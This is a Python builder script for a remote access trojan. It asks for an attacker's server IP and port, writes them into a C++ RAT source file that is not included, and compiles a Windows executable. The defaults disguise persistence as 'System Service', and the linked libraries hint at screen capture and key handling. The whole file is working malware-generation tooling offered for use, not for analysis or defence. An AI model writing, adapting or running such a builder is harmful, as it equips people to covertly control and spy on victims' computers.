#!/usr/bin/env python3
import os
import sys
import random
import string
import tempfile
import shutil
import subprocess
import re  
from colorama import Fore, Style, init # type: ignore

# Initialize colorama
init()



def print_banner():
    """Print the RAT Client Generator banner with gradient colors"""
    # Banner with gradient colors (RED -> WHITE -> LIGHTBLUE_EX) like in server_ui_utils.py
    print(f"""
{Fore.RED}██████╗ {Fore.WHITE} █████╗ {Fore.LIGHTBLUE_EX}████████╗{Fore.RED} █████╗ {Fore.WHITE}████████╗{Fore.LIGHTBLUE_EX} ██████╗ {Fore.RED}██╗   ██╗{Fore.WHITE}██╗{Fore.LIGHTBLUE_EX}██╗     {Fore.RED}██╗     {Fore.WHITE}███████╗{Style.RESET_ALL}
{Fore.RED}██╔══██╗{Fore.WHITE}██╔══██╗{Fore.LIGHTBLUE_EX}╚══██╔══╝{Fore.RED}██╔══██╗{Fore.WHITE}╚══██╔══╝{Fore.LIGHTBLUE_EX}██╔═══██╗{Fore.RED}██║   ██║{Fore.WHITE}██║{Fore.LIGHTBLUE_EX}██║     {Fore.RED}██║     {Fore.WHITE}██╔════╝{Style.RESET_ALL}
{Fore.RED}██████╔╝{Fore.WHITE}███████║{Fore.LIGHTBLUE_EX}   ██║   {Fore.RED}███████║{Fore.WHITE}   ██║   {Fore.LIGHTBLUE_EX}██║   ██║{Fore.RED}██║   ██║{Fore.WHITE}██║{Fore.LIGHTBLUE_EX}██║     {Fore.RED}██║     {Fore.WHITE}█████╗  {Style.RESET_ALL}
{Fore.RED}██╔══██╗{Fore.WHITE}██╔══██║{Fore.LIGHTBLUE_EX}   ██║   {Fore.RED}██╔══██║{Fore.WHITE}   ██║   {Fore.LIGHTBLUE_EX}██║   ██║{Fore.RED}██║   ██║{Fore.WHITE}██║{Fore.LIGHTBLUE_EX}██║     {Fore.RED}██║     {Fore.WHITE}██╔══╝  {Style.RESET_ALL}
{Fore.RED}██║  ██║{Fore.WHITE}██║  ██║{Fore.LIGHTBLUE_EX}   ██║   {Fore.RED}██║  ██║{Fore.WHITE}   ██║   {Fore.LIGHTBLUE_EX}╚██████╔╝{Fore.RED}╚██████╔╝{Fore.WHITE}██║{Fore.LIGHTBLUE_EX}███████╗{Fore.RED}███████╗{Fore.WHITE}███████╗{Style.RESET_ALL}
{Fore.RED}╚═╝  ╚═╝{Fore.WHITE}╚═╝  ╚═╝{Fore.LIGHTBLUE_EX}   ╚═╝   {Fore.RED}╚═╝  ╚═╝{Fore.WHITE}   ╚═╝   {Fore.LIGHTBLUE_EX}╚═════╝ {Fore.RED} ╚═════╝ {Fore.WHITE}╚═╝{Fore.LIGHTBLUE_EX}╚══════╝{Fore.RED}╚══════╝ {Fore.WHITE}╚══════╝{Style.RESET_ALL}
""")
    print(f"{Fore.CYAN}Advanced RAT Client Generator V1.5{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Generate customized RAT clients with advanced options{Style.RESET_ALL}\n")

def validate_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        try:
            num = int(part)
            if num < 0 or num > 255:
                return False
        except ValueError:
            return False
    return True

def validate_port(port):
    try:
        port_num = int(port)
        return 1 <= port_num <= 65535
    except ValueError:
        return False

def generate_random_string(length=8):
    """Generate a random string for variable renaming"""
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def generate_client(options):
    # Source file path
    source_file = "rat_clientv1.5.cpp"
    
    if not os.path.exists(source_file):
        print(f"{Fore.RED}Error: Source file {source_file} not found!{Style.RESET_ALL}")
        return False
    
    # Create a temporary directory
    temp_dir = tempfile.mkdtemp()
    temp_file = os.path.join(temp_dir, "modified_client.cpp")
    
    try:
        # Read the source file
        with open(source_file, 'r') as f:
            content = f.read()
        
        # Replace SERVER_IP and SERVER_PORT values correctly
        # Look for the pattern #define SERVER_IP "127.0.0.1" and replace just the IP part
        content = re.sub(r'#define SERVER_IP "[^"]+"', f'#define SERVER_IP "{options["ip"]}"', content)
        content = re.sub(r'#define PORT \d+', f'#define PORT {options["port"]}', content)
        
        # Write to temporary file
        with open(temp_file, 'w') as f:
            f.write(content)
        
        
        
        # Compile the modified source
        print(f"{Fore.CYAN}Compiling...{Style.RESET_ALL}")
        
        # Determine the compiler command based on OS
        if os.name == 'nt':  # Windows
            # Add all required libraries for GDI+ and other Windows graphics
            # Add -liphlpapi flag to link the IP Helper API library
            compile_cmd = f'g++ -o "{options["output"]}" "{temp_file}" -lws2_32 -lgdi32 -lole32 -lgdiplus -liphlpapi -DUNICODE -D_UNICODE -DprocessSpecialKey=processSpecialKey -fexec-charset=UTF-8'
        else:  # Linux/Mac (would need different libraries)
            print(f"{Fore.RED}Error: Compilation on non-Windows platforms not supported yet.{Style.RESET_ALL}")
            return False
        
        # Execute the compilation
        result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"{Fore.RED}Compilation failed:{Style.RESET_ALL}")
            print(result.stderr)
            return False
        
        print(f"{Fore.GREEN}Successfully compiled to {options['output']}{Style.RESET_ALL}")
        return True
        
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
        return False
    finally:
        # Clean up temporary directory
        shutil.rmtree(temp_dir)

def main():
    print_banner()
    
    # Default options
    options = {
        "ip": "",
        "port": "8888",
        "output": "rat_client.exe",
        "icon_path": "",
        "startup_name": "System Service"
    }
    
     # Get user input with enhanced formatting
    print(f"{Fore.CYAN}╔{'═' * 50}╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Fore.YELLOW} Enter the server details:{' ' * 24}{Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚{'═' * 50}╝{Style.RESET_ALL}\n")
    
    # Get and validate IP with enhanced prompt
    while True:
        options["ip"] = input(f"{Fore.RED}[{Fore.WHITE}+{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Server IP {Fore.YELLOW}➤ {Style.RESET_ALL}")
        if validate_ip(options["ip"]):
            break
        print(f"{Fore.RED}[!] Invalid IP address. Please enter a valid IPv4 address.{Style.RESET_ALL}")

    # Get and validate port with enhanced prompt
    while True:
        port = input(f"{Fore.RED}[{Fore.WHITE}+{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Server Port {Fore.YELLOW}[8888] ➤ {Style.RESET_ALL}")
        if port == "":
            port = "8888"
        if validate_port(port):
            options["port"] = port
            break
        print(f"{Fore.RED}[!] Invalid port. Please enter a number between 1 and 65535.{Style.RESET_ALL}")
    
    # Get output filename with enhanced prompt
    output_name = input(f"{Fore.RED}[{Fore.WHITE}+{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Output filename {Fore.YELLOW}[rat_client.exe] ➤ {Style.RESET_ALL}")
    if output_name != "":
        options["output"] = output_name
    
    # Add .exe extension if not present
    if not options["output"].lower().endswith('.exe'):
        options["output"] += '.exe'
    
    # Generate the client
    print(f"\n{Fore.CYAN}╔{'═' * 50}╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Fore.YELLOW} Generating client with the following settings:{' ' * 3}{Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╠{'═' * 50}╣{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Fore.WHITE}  • Server IP:      {Fore.LIGHTGREEN_EX}{options['ip']}{' ' * (29 - len(options['ip']))} {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Fore.WHITE}  • Server Port:    {Fore.LIGHTGREEN_EX}{options['port']}{' ' * (29 - len(options['port']))} {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Fore.WHITE}  • Output filename:{Fore.LIGHTGREEN_EX} {options['output']}{' ' * (28 - len(options['output']))} {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚{'═' * 50}╝{Style.RESET_ALL}\n")
    
    # Actually generate the client
    generate_client(options)

if __name__ == "__main__":
    main()




